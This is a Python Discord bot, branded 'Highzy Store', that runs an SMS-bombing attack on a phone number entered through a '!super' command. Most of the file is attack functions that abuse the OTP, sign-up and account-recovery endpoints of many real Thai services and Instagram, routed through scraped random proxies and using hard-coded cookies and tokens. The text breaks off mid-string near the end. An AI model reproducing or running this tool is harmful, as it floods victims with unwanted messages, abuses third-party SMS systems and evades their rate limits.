# Botsmsgod.py

import discord
import requests as ru
import threading
import requests
import time
import random
import os
import datetime
import sys
from concurrent.futures import ThreadPoolExecutor
import random
from re import search
from requests import Session
from re import search
from bs4 import BeautifulSoup as bs
from user_agent import generate_user_agent
from requests import Session,post,get
from discord.ext import commands
import os
from flask import Flask, render_template
from threading import Thread
from dotenv import load_dotenv
app = Flask('')
@app.route('/')
def home():
  return "bot python is online!"
def index():
  return render_template("index.html")
def run():
  app.run(host='0.0.0.0', port=8080)
def keep_alive():
  t = Thread(target=run)
  t.start()

bot_key = [""]
TOKEN = bot_key

proxy = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt").text
f = open("proxy.txt", "w")
t = f.write(proxy)
g = open("proxy.txt", "r")
s = g.read().splitlines()

threading = ThreadPoolExecutor(max_workers=int(100000000))
headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}
bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())

@bot.event
async def on_ready():
  print(f"Bot {bot.user.name} is ready!")
  await bot.change_presence(activity=discord.Streaming(
      name='Highzy Store', url='https://www.twitch.tv/example_channel'))
	
# spam sms
@bot.command("super")
async def super(ctx, no=None, jam:int=None):
	try:
		if (str(ctx.message.channel.id) == "1168522772180385855"):
			if (no == None or jam == None):
				response = discord.Embed(title="Highzy Store",description="Highzy Spamsms",color=0xe31010)
				await ctx.reply(embed=response)
			else:
				phone = no
				jam = jam
				embed = discord.Embed(title="✅ SUCCESS",description=f"ATTACKING TO [PHONE] > ||{no}|| [AMOUNT] > {jam}/3000",color=0x45fc03)
				embed.set_image(url="https://cdn.discordapp.com/attachments/1179255248787873953/1180415784967745536/high.png?ex=657d56de&is=656ae1de&hm=cc029525f43241fcb400d0befaaa53d0be8831b7d0e1cf83e3565ff8eaa51144&")
				await ctx.reply(embed=embed)
				SMS(phone, jam)
	except:
		response = discord.Embed(title="Highzy Store",description="Highzy Spamsms",color=0xe31010)
		await ctx.reply(embed=response)

def api1(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  send = Session()
  send.headers.update({
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
      'content-type':
      'application/x-www-form-urlencoded; charset=UTF-8'
  })
  sms = send.post("https://api.jobbkk.com/v1/easy/otp_code",
                  data="mobile=" + phone,
                  proxies={'http': 'http://' + random.choice(s)})
  if sms.status_code == 200 or sms.status_code == 201:
    print(
        f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success | {sms.status_code}"
    )
  else:
    print(
        f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   | {sms.status_code}"
    )


def api2(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
      "https://www.theconcert.com/rest/request-otp",
      headers={
          "x-xsrf-token":
          "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA",
          "x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc",
          "cookie":
          "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA",
          "user-agent":
          "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
          "content-type": "application/json;charset=UTF-8"
      },
      json={
          "mobile": phone,
          "country_code": "TH",
          "lang": "th",
          "channel": "sms",
          "digit": 4
      },
      proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(
        f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success | {r.status_code}"
    )
  else:
    print(
        f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   | {r.status_code}"
    )


def api3(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
      "https://www.carsome.co.th/website/login/sendSMS",
      headers={
          "user-agent":
          "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
          "cookie":
          "amp_893e6b=w-newQWGaJ9H7YmD5KD1Jg...1g6l3e5ht.1g6l3e5ht.0.0.0;cky-active-check=yes;ajs_anonymous_id=bc6fbe42-9d69-40d9-93db-ba6b777861c1;_gcl_au=1.1.1543614339.1656418159;_ALGOLIA=anonymous-0a2bcc78-8c2b-4051-bfea-97cb347b1e17;__lt__cid=f282ddb1-0630-4c9e-ab88-27f6bd651a35;__lt__sid=530143c9-c9d21696;cookieyesID=R1V5aHU4eWswY21YbjM0NHFGb1FVc1pObDc3U2NSYkk=;moe_uuid=ff0db811-2642-4a84-83a3-7dd26d9c33a1;__cf_bm=4SQWD6XX3mlhMhXrkJ8A1.4MzqJ80OVt9BMJ9NH5uFw-1656418177-0-AdYubBhGil+XHg2/1J8WHy36qRL2urjlZUNUYGwGOkQyg0wlFLvwXAv8ugmj2IdM5ZaTfFxlz/2lRwsTuRRxnrQ=;cky-consent=no;cookieyes-necessary=yes;cookieyes-functional=no;cookieyes-analytics=no;cookieyes-performance=no;cookieyes-advertisement=no;cookieyes-other=no"
      },
      json={
          "username": phone,
          "optType": 0
      },
      proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(
        f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success | {r.status_code}"
    )
  else:
    print(
        f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   | {r.status_code}"
    )


def api4(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.get(
      f"https://nocnoc.com/authentication-service/user/OTP/verify-phone/%2B66{phone[1:]}?lang=th&userType=BUYER&locale=th&orgIdfier=scg&phone=%2B66{phone[1:]}&phoneCountryCode=%2B66&b-uid=1.0.760",
      headers={
          "authorization":
          "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..MSrqMX5S5Ui8NbGvEih2uw.NCJuqSPHzIwZ0Jy4Snq25pKUa887meHakzTe3YTCUnVsMwY8cQMnJ-nOr6Lbb5irc2gr8VfD0G2ZYocg22oVH36DdBnfoJirezzLuf9Uc2DiaQHLJ8OJY3UHo8fLUMB7BYe2w0Q5fDdMF1N0u8_aGA.ZNn49ubbJXSlycijnTncbQ"
      },
      proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(
        f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success | {r.status_code}"
    )
  else:
    print(
        f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   | {r.status_code}"
    )


def api5(phone):
  requests.post(
      "https://www.instagram.com/accounts/account_recovery_send_ajax/",
      data=f"email_or_username={phone}&recaptcha_challenge_field=",
      headers={
          "Content-Type": "application/x-www-form-urlencoded",
          "X-Requested-With": "XMLHttpRequest",
          "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36",
          "x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"
      }).json


def api6(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
      "https://api.freshket.co/baseApi/Users/RequestOtp",
      headers={
          "User-Agent":
          "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
          "Content-Type": "application/json;charset=UTF-8"
      },
      json={
          "isDev": "false",
          "language": "th",
          "phone": f"+66{phone[1:]}"
      },
      proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(
        f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success | {r.status_code}"
    )
  else:
    print(
        f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   | {r.status_code}"
    )


def api7(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
      "https://api.true-shopping.com/customer/api/request-activate/mobile_no",
      data={"username": phone},
      proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(
        f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success | {r.status_code}"
    )
  else:
    print(
        f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   | {r.status_code}"
    )


def api8(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.get(
      f"https://hdmall.co.th/phone_verifications?express_sign_in=1&mobile={phone}",
      proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(
        f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success | {r.status_code}"
    )
  else:
    print(
        f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   | {r.status_code}"
    )


def api9(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
      "https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp",
      data={"mobile_phone_no": phone},
      proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(
        f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success | {r.status_code}"
    )
  else:
    print(
        f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   | {r.status_code}"
    )


def api10(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.get(
      f"https://api.joox.com/web-fcgi-bin/web_account_manager?optype=5&os_type=2&country_code=66&phone_number=0{phone}&time=1641777424446&_=1641777424449&callback=axiosJsonpCallback2",
      proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(
        f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success | {r.status_code}"
    )
  else:
    print(
        f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   | {r.status_code}"
    )


def api11(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
      "https://www.mtsblockchain.com/mgb-api/user/register/reqotp",
      json={"mobile": phone},
      headers={
          "Content-Type":
          "application/json",
          "Cookie":
          "_ga=GA1.2.1476569446.1657959172; _gid=GA1.2.587325211.1657959172; _gat_gtag_UA_230676474_1=1; connect.sid=s%3Avu1rVQbmGkMrSzQS7GYQ-y4VHMxHdmH7.zuhlp%2BBtukL2ksityudE9OTqdUH5G3dk3XHm3zNEHIs; cookie_policy_accepted=1",
          "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"
      },
      proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(
        f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success | {r.status_code}"
    )
  else:
    print(
        f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   | {r.status_code}"
    )


def api12(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
      "https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",
      json={
          "username": phone,
          "password": "6302814184624az",
          "name": "0903281894",
          "provinceCode": "28",
          "districtCode": "393",
          "subdistrictCode": "3494",
          "zipcode": "40260",
          "siebelCustomerTypeId": "710",
          "acceptTermAndCondition": "true",
          "hasSeenConsent": "false",
          "locale": "th_TH"
      },
      proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(
        f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success | {r.status_code}"
    )
  else:
    print(
        f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   | {r.status_code}"
    )


def api13(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
      "https://api.ulive.youpik.com/api-base/sms/sendCode",
      headers={
          "authorization":
          "Basic d2ViQXBwOndlYkFwcA==",
          "content-type":
          "application/x-www-form-urlencoded;charset=UTF-8",
          "user-agent":
          "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"
      },
      data=f"phone={phone[1:]}&type=1",
      proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(
        f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success | {r.status_code}"
    )
  else:
    print(
        f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   | {r.status_code}"
    )


def api14(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
      "https://pygw.csne.co.th/api/gateway/truewalletRequestOtp",
      headers={
          "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
          "user-agent":
          "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
          "cookie": "pygw_csne_coth=91207b7404b2c71edd9db8c43c6d18c23949f5ea"
      },
      data=f"transactionId=b05a66a7e9d0930cbda4d78b351ea6f7&phone={phone}",
      proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(
        f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success | {r.status_code}"
    )
  else:
    print(
        f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   | {r.status_code}"
    )


def api15(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
      "https://vaccine.trueid.net/vacc-verify/api/getotp",
      headers={
          "user-agent":
          "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
          "content-type":
          "application/json;charset=UTF-8",
          "accept":
          "application/json, text/plain, */*",
          "cookie":
          "_gcl_au=1.1.628507904.1657519113;_cbclose=1;_cbclose26068=1;_uid26068=51BC4E60.1;_ctout26068=1;verify=test;_ga=GA1.2.682897436.1657519114;_gid=GA1.2.1721036016.1657519114;_gat_UA-86733131-1=1;_fbp=fb.1.1657519114976.1588263006;afUserId=64e5ba75-c9e2-4e45-aa62-7f5318ec6d9c-p;AF_SYNC=1657519116965;_ga_R05PJC3ZG8=GS1.1.1657519113.1.1.1657519130.43;OptanonAlertBoxClosed=2022-07-11T05:58:54.186Z;OptanonConsent=isIABGlobal=false&datestamp=Mon+Jul+11+2022+12%3A58%3A54+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.13.0&hosts=&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1%2CC0005%3A1"
      },
      json={
          "msisdn": phone,
          "function": "enroll"
      },
      proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(
        f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success | {r.status_code}"
    )
  else:
    print(
        f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   | {r.status_code}"
    )


def api16(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  session = Session()
  ReqTOKEN = session.get(
      "https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated",
      headers={
          "User-Agent":
          "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"
      }).text
  r = session.post(
      "https://srfng.ais.co.th/login/sendOneTimePW",
      data=
      f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",
      headers={
          "User-Agent":
          "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
          "Content-Type":
          "application/x-www-form-urlencoded; charset=UTF-8",
          "authorization":
          f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''
      },
      proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(
        f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success | {r.status_code}"
    )
  else:
    print(
        f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   | {r.status_code}"
    )


def api17(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
      "https://www.kaitorasap.co.th/api/index.php/send-otp-login/",
      headers={
          "Accept":
          "application/json, text/javascript, */*; q=0.01",
          "Content-Type":
          "application/x-www-form-urlencoded; charset=UTF-8",
          "X-Requested-With":
          "XMLHttpRequest",
          "User-Agent":
          "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
          "Cookie":
          "PHPSESSID=080ugg4928ulkhj6kaggiqkvd1; _ga=GA1.3.1856390916.1657557339; _gid=GA1.3.1103002458.1657557339; _gat_gtag_UA_141105037_1=1; G_ENABLED_IDPS=google"
      },
      data=f"phone_number={phone}&lag=",
      proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(
        f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success | {r.status_code}"
    )
  else:
    print(
        f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   | {r.status_code}"
    )


def api18(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.get(
      f'https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code&phone={phone}',
      headers={
          "accept":
          "application/json, text/javascript, */*; q=0.01",
          "x-requested-with":
          "XMLHttpRequest",
          "user-agent":
          generate_user_agent(),
          "cookie":
          "referer=https%3A%2F%2Fwww.konvy.com%2Fm%2F;PHPSESSID=vnqlo8v638jofnb15arplijj3i;k_privacy_state=true;referer=https%3A%2F%2Fwww.konvy.com%2Fm%2Flogin.php;_gcl_au=1.1.531291202.1661272286;_fbp=fb.1.1661272286002.265391910;_gid=GA1.2.960487052.1661272286;_gat_UA-28072727-2=1;_tt_enable_cookie=1;_ttp=d640ab77-0c
